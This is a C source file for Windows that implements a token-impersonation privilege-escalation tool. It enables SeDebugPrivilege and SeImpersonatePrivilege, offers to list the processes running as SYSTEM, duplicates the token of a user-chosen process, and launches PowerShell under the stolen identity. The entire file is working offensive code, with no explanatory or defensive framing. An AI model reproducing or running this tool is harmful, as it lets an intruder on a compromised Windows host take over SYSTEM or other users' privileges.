#include <Windows.h>
#include <stdio.h>

BOOL enablePrivs();

BOOL duplicateToken(DWORD pid) {
	//Check for SeDebugPrivilege and enable it
	enablePrivs();

	//Get a handle to the process's token with the necessary privileges
	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (!hProc) {
		printf("[-] Unable to get a handle to the process...\n");
		printf("%d\n", GetLastError());
		ExitProcess(-1);
	}

	//Get a handle to the token
	HANDLE hToken;
	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_ASSIGN_PRIMARY , &hToken)) {
		printf("[-] Failed to open the process's token...\n");
		ExitProcess(-1);
	}

	//Duplicate the token
	SECURITY_IMPERSONATION_LEVEL sil = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE newToken = nullptr;
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr, sil, tokenType, &newToken)) {
		printf("[-] Unable to duplicate token...\n");
		ExitProcess(-1);
	}

	printf("[+] Token duplicated successfully\n");
	printf("[+] Launching PowerShell...\n");
	
	//Create a new process with the duplicated token
	STARTUPINFOEX sinfo = {};
	PROCESS_INFORMATION pi = {};
	if (!CreateProcessWithTokenW(newToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", nullptr, CREATE_NEW_CONSOLE, nullptr, nullptr, (LPSTARTUPINFOW)&sinfo, &pi)) {
		printf("[-] Error");
		printf("%d",GetLastError());
	}

	return TRUE;

}
//Enables seDebugPrivilege & seImpersonatePrivilege
BOOL enablePrivs() {
	LUID debugPriv;
	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &debugPriv)) {
		printf("Unable to lookup privilege value...\n");
	}

	LUID impersonatePriv;
	if (!LookupPrivilegeValue(nullptr, SE_IMPERSONATE_NAME, &impersonatePriv)) {
		printf("Unable to lookup privilege value...\n");
	}

	HANDLE currentProcTokenHandle;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentProcTokenHandle)) {
		printf("Failed to open the process's token...\n");
	}

	DWORD structSize;
	GetTokenInformation(currentProcTokenHandle, TokenPrivileges, NULL, 0, &structSize);

	DWORD structSize2;
	TOKEN_PRIVILEGES* tp = (TOKEN_PRIVILEGES*)malloc(structSize);
	if (!GetTokenInformation(currentProcTokenHandle, TokenPrivileges, tp, structSize, &structSize2)) {
		free(tp);
		printf("Could not get token privileges...\n");
	}

	BOOL seDebugPrivAvailable = FALSE;
	BOOL seImpersonatePrivAvailable = FALSE;
	LUID_AND_ATTRIBUTES iterator;
	for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
		iterator = tp->Privileges[i];

		if ((iterator.Luid.LowPart == debugPriv.LowPart) && (iterator.Luid.HighPart == debugPriv.HighPart)) {
			seDebugPrivAvailable = TRUE;
		}
		if ((iterator.Luid.LowPart == impersonatePriv.LowPart) && (iterator.Luid.HighPart == impersonatePriv.HighPart)) {
			seImpersonatePrivAvailable = TRUE;
		}
		if (seDebugPrivAvailable == TRUE && seImpersonatePrivAvailable == TRUE) {
			break;
		}
	}

	//Enable seDebugPrivilege
	TOKEN_PRIVILEGES privs;
	privs.PrivilegeCount = 1;
	privs.Privileges[0].Luid = debugPriv;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(currentProcTokenHandle, FALSE, &privs, 0, nullptr, nullptr)) {
		printf("Enabling seDebugPrivilege failed\n");
	}

	privs.Privileges[0].Luid = impersonatePriv;
	if (!AdjustTokenPrivileges(currentProcTokenHandle, FALSE, &privs, 0, nullptr, nullptr)) {
		printf("Enabling seImpersonatePrivilege failed\n");
	}

	free(tp);
	return TRUE;

}

int main(int argc, char** argv)
{
	int ans1;
	char ans2[7];

	printf("[+] List processes running under SYSTEM? (Y/N):\n");
	ans1 = getchar();

	if (ans1 == 'Y' || ans1 == 'y') {
		system("tasklist /V /FI \"username eq system\"");
	}
	
	printf("[+] Enter PID:\n");
	scanf_s("%s",ans2,7);

	if (!atoi(ans2)) {
		printf("[-] Error: PID format incorrect...\n");
		ExitProcess(-1);
	}
	
	int pid = atoi(ans2);
	//Check for SeImpersonatePrivilege and enable it
	//checkPrivilege(SE_IMPERSONATE_NAME);
	//enablePrivilege(SE_IMPERSONATE_NAME);

	duplicateToken(pid);
}
